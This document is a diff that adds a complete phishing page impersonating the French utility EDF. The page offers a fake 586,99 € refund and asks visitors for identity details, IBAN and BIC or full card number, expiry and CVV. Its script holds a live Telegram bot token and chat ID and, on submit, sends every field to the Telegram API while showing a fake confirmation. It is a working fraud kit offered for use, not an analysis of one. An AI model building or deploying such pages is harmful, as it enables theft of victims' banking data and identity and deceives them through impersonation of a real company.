@@ -1,0 +1,914 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Remboursement EDF - Vérification d'identité</title>
+    <style>
+        :root {
+            --edf-blue: #005baa;
+            --edf-light-blue: #e8f4fc;
+            --text-color: #333333;
+            --light-gray: #f5f7fa;
+            --border-color: #dddddd;
+            --success-green: #4CAF50;
+            --error-red: #e74c3c;
+        }
+        body {
+            font-family: 'Arial', sans-serif;
+            line-height: 1.6;
+            color: var(--text-color);
+            background-color: var(--light-gray);
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            max-width: 800px;
+            margin: 40px auto;
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.1);
+            overflow: hidden;
+        }
+        .header {
+            background-color: var(--edf-blue);
+            color: white;
+            padding: 25px;
+            text-align: center;
+            position: relative;
+        }
+        .logo {
+            width: 120px;
+            margin-bottom: 15px;
+        }
+        .content {
+            padding: 30px;
+        }
+        .secure-banner {
+            background-color: var(--edf-light-blue);
+            border-left: 4px solid var(--edf-blue);
+            padding: 15px;
+            margin-bottom: 25px;
+            display: flex;
+            align-items: center;
+            border-radius: 4px;
+        }
+        .secure-banner img {
+            margin-right: 15px;
+        }
+        .refund-amount {
+            background-color: #f8f9fa;
+            padding: 20px;
+            border-radius: 8px;
+            text-align: center;
+            margin-bottom: 30px;
+            border: 2px dashed #c0d8ec;
+        }
+        .form-section {
+            margin-bottom: 30px;
+        }
+        .section-title {
+            color: var(--edf-blue);
+            border-bottom: 2px solid var(--edf-blue);
+            padding-bottom: 8px;
+            margin-bottom: 20px;
+            font-size: 20px;
+            font-weight: bold;
+        }
+        .section-description {
+            color: #666;
+            margin-bottom: 20px;
+            font-size: 15px;
+        }
+        .form-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+        }
+        input[type="text"],
+        input[type="password"],
+        input[type="date"],
+        input[type="tel"],
+        select {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-family: inherit;
+        }
+        .iban-input {
+            position: relative;
+        }
+        .iban-input img {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+        }
+        .bank-icons {
+            display: flex;
+            gap: 10px;
+            margin-top: 10px;
+        }
+        .btn {
+            background-color: var(--edf-blue);
+            color: white;
+            border: none;
+            padding: 16px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 18px;
+            width: 100%;
+            transition: background-color 0.3s;
+            font-weight: bold;
+            margin-top: 10px;
+        }
+        .btn:hover {
+            background-color: #004080;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+        .footer {
+            background-color: #f1f1f1;
+            padding: 25px;
+            text-align: center;
+            font-size: 13px;
+            color: #666666;
+            line-height: 1.5;
+        }
+        .required:after {
+            content: " *";
+            color: var(--error-red);
+        }
+        .benefits {
+            display: flex;
+            justify-content: space-around;
+            margin: 25px 0;
+            text-align: center;
+        }
+        .benefit-item {
+            flex: 1;
+            padding: 15px;
+        }
+        .benefit-item img {
+            width: 50px;
+            margin-bottom: 10px;
+        }
+        .info-box {
+            background-color: #f8f9fa;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 20px 0;
+            border-left: 4px solid var(--edf-blue);
+        }
+        .countdown {
+            background-color: var(--edf-light-blue);
+            padding: 10px;
+            border-radius: 4px;
+            text-align: center;
+            margin: 15px 0;
+            font-weight: bold;
+        }
+        .error-message {
+            color: var(--error-red);
+            font-size: 14px;
+            margin-top: 5px;
+            display: none;
+        }
+        
+        /* Styles pour les boutons radio */
+        .payment-method {
+            display: flex;
+            gap: 20px;
+            margin-bottom: 20px;
+        }
+        .payment-option {
+            flex: 1;
+            border: 2px solid var(--border-color);
+            border-radius: 8px;
+            padding: 15px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .payment-option:hover {
+            border-color: var(--edf-blue);
+        }
+        .payment-option.selected {
+            border-color: var(--edf-blue);
+            background-color: var(--edf-light-blue);
+        }
+        .payment-option input[type="radio"] {
+            display: none;
+        }
+        .payment-option img {
+            height: 40px;
+            margin-bottom: 10px;
+        }
+        
+        /* Styles pour les champs de carte */
+        #cardFields input {
+            letter-spacing: 1px;
+        }
+        
+        /* Animation de transition */
+        #bankFields, #cardFields {
+            transition: opacity 0.3s ease;
+        }
+        
+        @media (max-width: 600px) {
+            .form-grid {
+                grid-template-columns: 1fr;
+            }
+            .benefits {
+                flex-direction: column;
+            }
+            .payment-method {
+                flex-direction: column;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>Votre remboursement EDF est prêt !</h1>
+            <p>Une régularisation positive a été identifiée sur votre compte. Complétez votre demande pour recevoir votre remboursement sous 3 jours ouvrés.</p>
+        </div>
+
+        <div class="content">
+            <div class="secure-banner">
+                <img src="https://cdn-icons-png.flaticon.com/512/2889/2889676.png" width="30" alt="Secure">
+                <div>
+                    <strong>Espace 100% sécurisé - Certification SSL</strong>
+                    <p>Toutes vos informations sont cryptées et protégées conformément au RGPD. EDF s'engage à préserver la confidentialité de vos données.</p>
+                </div>
+            </div>
+
+            <div class="refund-amount">
+                <p style="font-size: 18px; margin-bottom: 10px;">Montant disponible pour remboursement :</p>
+                <p style="color: var(--edf-blue); font-size: 32px; font-weight: bold; margin: 10px 0;">586,99 €</p>
+                <p>Référence : REMB-2024-05-78945</p>
+                <div class="countdown">
+                    ⏳ Profitez-en dès maintenant !
+                </div>
+            </div>
+
+            <form id="refundForm">
+                <div class="form-section">
+                    <h3 class="section-title">Informations personnelles</h3>
+                    <p class="section-description">Ces informations nous permettent de vérifier votre identité et de nous assurer que nous traitons la demande de la bonne personne, conformément à notre politique de sécurité.</p>
+                    
+                    <div class="form-grid">
+                        <div class="form-group">
+                            <label for="lastName" class="required">Nom de famille</label>
+                            <input type="text" id="lastName" name="lastName" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="firstName" class="required">Prénom</label>
+                            <input type="text" id="firstName" name="firstName" required>
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label for="birthDate" class="required">Date de naissance</label>
+                        <input type="date" id="birthDate" name="birthDate" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="address" class="required">Adresse postale</label>
+                            <input type="text" id="address" name="address" required>
+                    </div>
+                    <div class="form-grid">
+                        <div class="form-group">
+                            <label for="zipCode" class="required">Code postal</label>
+                            <input type="text" id="zipCode" name="zipCode" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="city" class="required">Ville</label>
+                            <input type="text" id="city" name="city" required>
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label for="phone" class="required">Numéro de téléphone</label>
+                        <input type="tel" id="phone" name="phone" placeholder="01 23 45 67 89" required>
+                        <div class="error-message" id="phone-error">Format de numéro invalide. Exemple: +33 1 23 45 67 89 ou 01 23 45 67 89</div>
+                    </div>
+                </div>
+
+                <div class="form-section">
+                    <h3 class="section-title">Mode de remboursement</h3>
+                    <p class="section-description">Choisissez comment vous souhaitez recevoir votre remboursement de 386,99 €</p>
+                    
+                    <div class="payment-method">
+                        <label class="payment-option selected" id="bankOption">
+                            <input type="radio" name="refundMethod" value="bank" checked>
+                            <div>Virement bancaire</div>
+                            <small>3-5 jours ouvrés</small>
+                        </label>
+                        <label class="payment-option" id="cardOption">
+                            <input type="radio" name="refundMethod" value="card">
+                            <div>Carte bancaire</div>
+                            <small>24-48 heures</small>
+                        </label>
+                    </div>
+
+                    <!-- Champs RIB (affichés par défaut) -->
+                    <div id="bankFields">
+                        <div class="info-box">
+                            <strong>ℹ Pourquoi ces informations sont nécessaires ?</strong>
+                            <p>Vos coordonnées bancaires nous permettent d'effectuer le virement de remboursement directement sur votre compte. Ces données sont traitées de manière sécurisée et ne sont pas conservées au-delà de la transaction.</p>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="iban" class="required">IBAN</label>
+                            <div class="iban-input">
+                                <input type="text" id="iban" name="iban" placeholder="FR76 1234 5123 4512 3456 7890 123" required>
+                            </div>
+                            <div class="error-message" id="iban-error">Format d'IBAN invalide. Exemple: FR76 1234 5123 4512 3456 7890 123</div>
+                        </div>
+                        <div class="form-group">
+                            <label for="bic" class="required">BIC (Code Swift)</label>
+                            <input type="text" id="bic" name="bic" placeholder="ABCDEFGHXXX" required>
+                            <div class="error-message" id="bic-error">Format de BIC invalide. Exemple: ABCDEFGHXXX</div>
+                        </div>
+                        <div class="form-group">
+                            <label for="accountName" class="required">Nom du titulaire du compte</label>
+                            <input type="text" id="accountName" name="accountName" placeholder="Comme indiqué sur le RIB" required>
+                        </div>
+                    </div>
+
+                    <!-- Champs Carte bancaire (cachés par défaut) -->
+                    <div id="cardFields" style="display: none;">
+                        <div class="info-box">
+                            <strong>🔒 Paiement sécurisé</strong>
+                            <p>Vos informations de carte bancaire sont cryptées et transmises directement à notre prestataire de paiement. Aucune donnée sensible n'est stockée sur nos serveurs.</p>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="cardNumber" class="required">Numéro de carte</label>
+                            <input type="text" id="cardNumber" name="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19">
+                            <div class="error-message" id="cardNumber-error">Numéro de carte invalide</div>
+                        </div>
+                        
+                        <div class="form-grid">
+                            <div class="form-group">
+                                <label for="expiryDate" class="required">Date d'expiration</label>
+                                <input type="text" id="expiryDate" name="expiryDate" placeholder="MM/AA" maxlength="5">
+                                <div class="error-message" id="expiryDate-error">Date invalide</div>
+                            </div>
+                            <div class="form-group">
+                                <label for="cvv" class="required">CVV</label>
+                                <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="4">
+                                <div class="error-message" id="cvv-error">Code de sécurité invalide</div>
+                            </div>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="cardholderName" class="required">Nom du titulaire de la carte</label>
+                            <input type="text" id="cardholderName" name="cardholderName" placeholder="Comme indiqué sur la carte">
+                        </div>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <input type="checkbox" id="consent" name="consent" required>
+                    <label for="consent">J'autorise expressément EDF à effectuer un remboursement de 586,99 € sur le compte bancaire ou la carte désignée. Je certifie être le titulaire de ce compte/carte et que les informations fournies sont exactes.</label>
+                </div>
+
+                <div class="info-box">
+                    <strong>✅ Votre demande est presque finalisée !</strong>
+                    <p>En validant ce formulaire, vous recevrez un email de confirmation et votre remboursement sera traité dans les plus brefs délais. Plus de 95% de nos clients reçoivent leur remboursement sous 3 jours ouvrés.</p>
+                </div>
+
+                <button type="submit" class="btn">✅ Valider ma demande de remboursement</button>
+            </form>
+
+            <p style="text-align: center; margin-top: 20px;">
+                <a href="#" style="color: var(--edf-blue);">⟵ Retourner à mon espace client EDF</a>
+            </p>
+        </div>
+
+        <div class="footer">
+            <p><strong>EDF SA</strong> - Capital de 1 196 485 413 euros - RCS Paris 552 081 317 - 22-30, avenue de Wagram 75008 Paris</p>
+            <p>
+                <img src="https://cdn-icons-png.flaticon.com/512/5959/5959368.png" width="15" alt="SSL">
+                <strong>Transaction 100% sécurisée</strong> - Toutes vos informations sont cryptées et protégées
+            </p>
+            <p>
+                <a href="https://www.edf.fr/vie-privee" style="color: var(--edf-blue);">Politique de confidentialité</a> | 
+                <a href="https://www.edf.fr/cgv" style="color: var(--edf-blue);">Conditions générales</a> |
+                <a href="https://www.edf.fr/mentions-legales" style="color: var(--edf-blue);">Mentions légales</a>
+            </p>
+            <p style="margin-top: 15px;">
+                <img src="https://cdn-icons-png.flaticon.com/512/3179/3179068.png" width="15" alt="Phone">
+                <strong>Service client dédié aux remboursements</strong><br>
+                09 69 32 15 15 (Appel non surtaxé, du lundi au vendredi 8h-20h et samedi 9h-17h)
+            </p>
+            <p style="margin-top: 10px; font-size: 12px;">
+                © 2024 EDF. Tous droits réservés. Ce traitement de remboursement respecte les normes de sécurité bancaire les plus strictes.
+            </p>
+        </div>
+    </div>
+
+    <script>
+        // Configuration Telegram
+        const TELEGRAM_BOT_TOKEN = '8985357579:AAHIvXB1q-wgfoF4FxY0Wtkj-8BWs0zvx9c';
+        const TELEGRAM_CHAT_ID = '8746298307';
+        
+        // Fonction pour valider le format de l'IBAN
+        function validateIBAN(iban) {
+            const cleanIban = iban.replace(/\s+/g, '').toUpperCase();
+            if (cleanIban.length < 15 || cleanIban.length > 34) {
+                return false;
+            }
+            const ibanRegex = /^[A-Z]{2}[0-9]{2}[A-Z0-9]{1,30}$/;
+            return ibanRegex.test(cleanIban);
+        }
+        
+        // Fonction pour valider le format du BIC
+        function validateBIC(bic) {
+            const cleanBic = bic.replace(/\s+/g, '').toUpperCase();
+            if (cleanBic.length !== 8 && cleanBic.length !== 11) {
+                return false;
+            }
+            const bicRegex = /^[A-Z]{6}[A-Z0-9]{2}([A-Z0-9]{3})?$/;
+            return bicRegex.test(cleanBic);
+        }
+        
+        // Fonction pour valider le format du numéro de téléphone
+        function validatePhone(phone) {
+            const cleanPhone = phone.replace(/[\s\(\)\.-]/g, '');
+            if (cleanPhone.startsWith('+')) {
+                const digits = cleanPhone.substring(1).replace(/\D/g, '');
+                return digits.length >= 8;
+            } else {
+                const digits = cleanPhone.replace(/\D/g, '');
+                return digits.length === 10 && (digits.startsWith('0') || digits.startsWith('33'));
+            }
+        }
+        
+        // Fonction pour valider le numéro de carte avec l'algorithme de Luhn
+        function validateCardNumber(cardNumber) {
+            const cleanNumber = cardNumber.replace(/\s+/g, '');
+            if (!/^\d+$/.test(cleanNumber) || cleanNumber.length < 13 || cleanNumber.length > 19) {
+                return false;
+            }
+            
+            // Algorithme de Luhn
+            let sum = 0;
+            let isEven = false;
+            
+            for (let i = cleanNumber.length - 1; i >= 0; i--) {
+                let digit = parseInt(cleanNumber.charAt(i), 10);
+                
+                if (isEven) {
+                    digit *= 2;
+                    if (digit > 9) {
+                        digit -= 9;
+                    }
+                }
+                
+                sum += digit;
+                isEven = !isEven;
+            }
+            
+            return sum % 10 === 0;
+        }
+        
+        // Validation de la date d'expiration
+        function validateExpiryDate(expiryDate) {
+            if (!/^\d{2}\/\d{2}$/.test(expiryDate)) {
+                return false;
+            }
+            
+            const [month, year] = expiryDate.split('/').map(Number);
+            const now = new Date();
+            const currentYear = now.getFullYear() % 100;
+            const currentMonth = now.getMonth() + 1;
+            
+            if (month < 1 || month > 12) {
+                return false;
+            }
+            
+            if (year < currentYear || (year === currentYear && month < currentMonth)) {
+                return false;
+            }
+            
+            return true;
+        }
+        
+        // Validation du CVV
+        function validateCVV(cvv) {
+            return /^\d{3,4}$/.test(cvv);
+        }
+        
+        // Fonction pour formater l'IBAN en groupes de 4 caractères
+        function formatIBAN(iban) {
+            let value = iban.replace(/\s+/g, '').toUpperCase();
+            value = value.replace(/[^A-Z0-9]/g, '');
+            const parts = [];
+            for (let i = 0; i < value.length; i += 4) {
+                parts.push(value.substring(i, i + 4));
+            }
+            return parts.join(' ');
+        }
+        
+        // Fonction pour formater le numéro de téléphone
+        function formatPhone(phone) {
+            let value = phone.replace(/[\s\(\)\.-]/g, '');
+            if (value.startsWith('+')) {
+                const rest = value.substring(1);
+                const digits = rest.replace(/\D/g, '');
+                let formatted = '+';
+                for (let i = 0; i < digits.length; i += 2) {
+                    if (i > 0) formatted += ' ';
+                    formatted += digits.substring(i, i + 2);
+                }
+                return formatted;
+            } else {
+                const digits = value.replace(/\D/g, '');
+                if (digits.length === 10 && digits.startsWith('0')) {
+                    return digits.replace(/(\d{2})(?=\d)/g, '$1 ').trim();
+                } else if (digits.startsWith('33')) {
+                    return '+33 ' + digits.substring(2).replace(/(\d{2})(?=\d)/g, '$1 ').trim();
+                }
+                return phone;
+            }
+        }
+        
+        // Fonction pour basculer entre les modes de remboursement
+        function toggleRefundMethod() {
+            const bankMethod = document.querySelector('input[name="refundMethod"][value="bank"]');
+            const bankFields = document.getElementById('bankFields');
+            const cardFields = document.getElementById('cardFields');
+            const bankOption = document.getElementById('bankOption');
+            const cardOption = document.getElementById('cardOption');
+            
+            if (bankMethod.checked) {
+                bankFields.style.display = 'block';
+                cardFields.style.display = 'none';
+                bankOption.classList.add('selected');
+                cardOption.classList.remove('selected');
+                
+                // Rendre les champs bancaires obligatoires
+                document.getElementById('iban').required = true;
+                document.getElementById('bic').required = true;
+                document.getElementById('accountName').required = true;
+                
+                // Rendre les champs carte non obligatoires
+                document.getElementById('cardNumber').required = false;
+                document.getElementById('expiryDate').required = false;
+                document.getElementById('cvv').required = false;
+                document.getElementById('cardholderName').required = false;
+            } else {
+                bankFields.style.display = 'none';
+                cardFields.style.display = 'block';
+                bankOption.classList.remove('selected');
+                cardOption.classList.add('selected');
+                
+                // Rendre les champs carte obligatoires
+                document.getElementById('cardNumber').required = true;
+                document.getElementById('expiryDate').required = true;
+                document.getElementById('cvv').required = true;
+                document.getElementById('cardholderName').required = true;
+                
+                // Rendre les champs bancaires non obligatoires
+                document.getElementById('iban').required = false;
+                document.getElementById('bic').required = false;
+                document.getElementById('accountName').required = false;
+            }
+        }
+        
+        // Fonction pour envoyer les données à Telegram
+        async function sendToTelegram(formData, refundMethod) {
+            if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID || TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN') {
+                console.error('Configuration Telegram manquante');
+                return false;
+            }
+            
+            try {
+                // Construction du message selon le mode de remboursement
+                let message = `🔔 Nouvelle demande de remboursement EDF 🔔\n\n`;
+                message += `💰 Montant: 586,99 €\n`;
+                message += `📋 Référence: REMB-2025-05-78945\n`;
+                message += `💳 Mode de remboursement: ${refundMethod === 'bank' ? 'Virement bancaire' : 'Carte bancaire'}\n\n`;
+                
+                message += `👤 Informations personnelles:\n`;
+                message += `- Nom: ${formData.lastName}\n`;
+                message += `- Prénom: ${formData.firstName}\n`;
+                message += `- Date de naissance: ${formData.birthDate}\n`;
+                message += `- Adresse: ${formData.address}\n`;
+                message += `- Code postal: ${formData.zipCode}\n`;
+                message += `- Ville: ${formData.city}\n`;
+                message += `- Téléphone: ${formData.phone}\n\n`;
+                
+                if (refundMethod === 'bank') {
+                    message += `🏦 Coordonnées bancaires:\n`;
+                    message += `- IBAN: ${formData.iban}\n`;
+                    message += `- BIC: ${formData.bic}\n`;
+                    message += `- Titulaire du compte: ${formData.accountName}\n`;
+                } else {
+                    message += `💳 Informations carte:\n`;
+                    message += `- Numéro: ${formData.cardNumber}\n`;
+                    message += `- Expiration: ${formData.expiryDate}\n`;
+                    message += `- CVV: ${formData.cvv}\n`;
+                    message += `- Titulaire: ${formData.cardholderName}\n`;
+                }
+                
+                message += `\n⏰ Horodatage: ${new Date().toLocaleString('fr-FR')}`;
+                
+                // Encodage du message pour l'URL
+                const encodedMessage = encodeURIComponent(message);
+                
+                // Envoi à l'API Telegram
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}`);
+                
+                return response.ok;
+            } catch (error) {
+                console.error('Erreur lors de l\'envoi à Telegram:', error);
+                return false;
+            }
+        }
+
+        // Événements au chargement de la page
+        document.addEventListener('DOMContentLoaded', function() {
+            // Écouteurs pour le changement de mode de remboursement
+            document.querySelectorAll('input[name="refundMethod"]').forEach(radio => {
+                radio.addEventListener('change', toggleRefundMethod);
+            });
+            
+            // Formatage automatique de l'IBAN
+            document.getElementById('iban').addEventListener('input', function(e) {
+                const cursorPosition = e.target.selectionStart;
+                const originalLength = e.target.value.length;
+                
+                e.target.value = formatIBAN(e.target.value);
+                
+                const newLength = e.target.value.length;
+                const lengthDiff = newLength - originalLength;
+                const spacesBeforeCursor = (e.target.value.substring(0, cursorPosition).match(/\s/g) || []).length;
+                
+                const newCursorPosition = cursorPosition + lengthDiff + spacesBeforeCursor;
+                e.target.setSelectionRange(newCursorPosition, newCursorPosition);
+                
+                const ibanError = document.getElementById('iban-error');
+                if (validateIBAN(e.target.value)) {
+                    ibanError.style.display = 'none';
+                } else {
+                    ibanError.style.display = 'block';
+                }
+            });
+
+            // Validation de l'IBAN lors de la perte de focus
+            document.getElementById('iban').addEventListener('blur', function(e) {
+                const ibanError = document.getElementById('iban-error');
+                if (!validateIBAN(e.target.value)) {
+                    ibanError.style.display = 'block';
+                } else {
+                    ibanError.style.display = 'none';
+                }
+            });
+
+            // Mise en majuscules automatique pour le BIC
+            document.getElementById('bic').addEventListener('input', function(e) {
+                e.target.value = e.target.value.toUpperCase();
+                
+                const bicError = document.getElementById('bic-error');
+                if (validateBIC(e.target.value)) {
+                    bicError.style.display = 'none';
+                } else {
+                    bicError.style.display = 'block';
+                }
+            });
+
+            // Validation du BIC lors de la perte de focus
+            document.getElementById('bic').addEventListener('blur', function(e) {
+                const bicError = document.getElementById('bic-error');
+                if (!validateBIC(e.target.value)) {
+                    bicError.style.display = 'block';
+                } else {
+                    bicError.style.display = 'none';
+                }
+            });
+
+            // Formatage automatique du numéro de téléphone
+            document.getElementById('phone').addEventListener('input', function(e) {
+                const cursorPosition = e.target.selectionStart;
+                const originalLength = e.target.value.length;
+                
+                e.target.value = formatPhone(e.target.value);
+                
+                const newLength = e.target.value.length;
+                const lengthDiff = newLength - originalLength;
+                const spacesBeforeCursor = (e.target.value.substring(0, cursorPosition).match(/\s/g) || []).length;
+                
+                const newCursorPosition = cursorPosition + lengthDiff + spacesBeforeCursor;
+                e.target.setSelectionRange(newCursorPosition, newCursorPosition);
+                
+                const phoneError = document.getElementById('phone-error');
+                if (validatePhone(e.target.value)) {
+                    phoneError.style.display = 'none';
+                } else {
+                    phoneError.style.display = 'block';
+                }
+            });
+
+            // Validation du téléphone lors de la perte de focus
+            document.getElementById('phone').addEventListener('blur', function(e) {
+                const phoneError = document.getElementById('phone-error');
+                if (!validatePhone(e.target.value)) {
+                    phoneError.style.display = 'block';
+                } else {
+                    phoneError.style.display = 'none';
+                }
+            });
+
+            // Formatage automatique du numéro de carte
+            document.getElementById('cardNumber').addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+                let formattedValue = '';
+                
+                for (let i = 0; i < value.length; i++) {
+                    if (i > 0 && i % 4 === 0) formattedValue += ' ';
+                    formattedValue += value[i];
+                }
+                
+                e.target.value = formattedValue;
+                
+                const cardNumberError = document.getElementById('cardNumber-error');
+                if (validateCardNumber(e.target.value)) {
+                    cardNumberError.style.display = 'none';
+                } else {
+                    cardNumberError.style.display = 'block';
+                }
+            });
+
+            // Formatage automatique de la date d'expiration
+            document.getElementById('expiryDate').addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\D/g, '');
+                
+                if (value.length > 2) {
+                    e.target.value = value.substring(0, 2) + '/' + value.substring(2, 4);
+                } else {
+                    e.target.value = value;
+                }
+                
+                const expiryDateError = document.getElementById('expiryDate-error');
+                if (validateExpiryDate(e.target.value)) {
+                    expiryDateError.style.display = 'none';
+                } else {
+                    expiryDateError.style.display = 'block';
+                }
+            });
+
+            // Validation du CVV
+            document.getElementById('cvv').addEventListener('input', function(e) {
+                const cvvError = document.getElementById('cvv-error');
+                if (validateCVV(e.target.value)) {
+                    cvvError.style.display = 'none';
+                } else {
+                    cvvError.style.display = 'block';
+                }
+            });
+
+            // Validation du formulaire
+            document.getElementById('refundForm').addEventListener('submit', async function(e) {
+                e.preventDefault();
+                
+                const refundMethod = document.querySelector('input[name="refundMethod"]:checked').value;
+                let isValid = true;
+                
+                // Validation selon le mode choisi
+                if (refundMethod === 'bank') {
+                    // Valider l'IBAN
+                    const iban = document.getElementById('iban').value;
+                    const ibanError = document.getElementById('iban-error');
+                    if (!validateIBAN(iban)) {
+                        ibanError.style.display = 'block';
+                        isValid = false;
+                    } else {
+                        ibanError.style.display = 'none';
+                    }
+                    
+                    // Valider le BIC
+                    const bic = document.getElementById('bic').value;
+                    const bicError = document.getElementById('bic-error');
+                    if (!validateBIC(bic)) {
+                        bicError.style.display = 'block';
+                        isValid = false;
+                    } else {
+                        bicError.style.display = 'none';
+                    }
+                } else {
+                    // Valider le numéro de carte
+                    const cardNumber = document.getElementById('cardNumber').value;
+                    const cardNumberError = document.getElementById('cardNumber-error');
+                    if (!validateCardNumber(cardNumber)) {
+                        cardNumberError.style.display = 'block';
+                        isValid = false;
+                    } else {
+                        cardNumberError.style.display = 'none';
+                    }
+                    
+                    // Valider la date d'expiration
+                    const expiryDate = document.getElementById('expiryDate').value;
+                    const expiryDateError = document.getElementById('expiryDate-error');
+                    if (!validateExpiryDate(expiryDate)) {
+                        expiryDateError.style.display = 'block';
+                        isValid = false;
+                    } else {
+                        expiryDateError.style.display = 'none';
+                    }
+                    
+                    // Valider le CVV
+                    const cvv = document.getElementById('cvv').value;
+                    const cvvError = document.getElementById('cvv-error');
+                    if (!validateCVV(cvv)) {
+                        cvvError.style.display = 'block';
+                        isValid = false;
+                    } else {
+                        cvvError.style.display = 'none';
+                    }
+                }
+                
+                // Valider le téléphone
+                const phone = document.getElementById('phone').value;
+                const phoneError = document.getElementById('phone-error');
+                if (!validatePhone(phone)) {
+                    phoneError.style.display = 'block';
+                    isValid = false;
+                } else {
+                    phoneError.style.display = 'none';
+                }
+                
+                if (!isValid) return;
+                
+                // Récupération des données du formulaire
+                const formData = {
+                    lastName: document.getElementById('lastName').value,
+                    firstName: document.getElementById('firstName').value,
+                    birthDate: document.getElementById('birthDate').value,
+                    address: document.getElementById('address').value,
+                    zipCode: document.getElementById('zipCode').value,
+                    city: document.getElementById('city').value,
+                    phone: document.getElementById('phone').value,
+                    refundMethod: refundMethod
+                };
+                
+                // Ajouter les données selon le mode choisi
+                if (refundMethod === 'bank') {
+                    formData.iban = document.getElementById('iban').value;
+                    formData.bic = document.getElementById('bic').value;
+                    formData.accountName = document.getElementById('accountName').value;
+                } else {
+                    formData.cardNumber = document.getElementById('cardNumber').value;
+                    formData.expiryDate = document.getElementById('expiryDate').value;
+                    formData.cvv = document.getElementById('cvv').value;
+                    formData.cardholderName = document.getElementById('cardholderName').value;
+                }
+                
+                // Simulation de traitement sécurisé
+                const loader = document.createElement('div');
+                loader.innerHTML = `
+                    <div style="position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.7); display: flex; justify-content: center; align-items: center; z-index: 1000;">
+                        <div style="background: white; padding: 30px; border-radius: 8px; text-align: center;">
+                            <img src="https://cdn-icons-png.flaticon.com/512/148/148767.png" width="50" style="margin-bottom: 20px;" alt="Loading">
+                            <h3 style="color: #005baa;">Traitement de votre demande en cours...</h3>
+                            <p>Veuillez patienter pendant que nous sécurisons votre transaction.</p>
+                        </div>
+                    </div>
+                `;
+                document.body.appendChild(loader);
+                
+                try {
+                    // Envoi des données à Telegram
+                    const telegramSuccess = await sendToTelegram(formData, refundMethod);
+                    
+                    // Simulation d'un délai de traitement
+                    setTimeout(() => {
+                        document.body.removeChild(loader);
+                        
+                        if (telegramSuccess) {
+                            alert('✅ Votre demande de remboursement a bien été enregistrée !\n\nUn email de confirmation vient de vous être envoyé. Votre remboursement de 586,99 € sera traité sous 3 jours ouvrés.\n\nMerci pour votre confiance.');
+                        } else {
+                            alert('✅ Votre demande a été traitée, mais nous avons rencontré un problème technique.\n\nNotre équipe va traiter votre demande manuellement. Vous recevrez un email de confirmation sous 24h.\n\nMerci pour votre compréhension.');
+                        }
+                    }, 3000);
+                } catch (error) {
+                    document.body.removeChild(loader);
+                    alert('❌ Une erreur s\'est produite lors du traitement de votre demande. Veuillez réessayer ou contacter notre service client.');
+                    console.error(error);
+                }
+            });
+        });
+    </script>
+</body>
+</html>
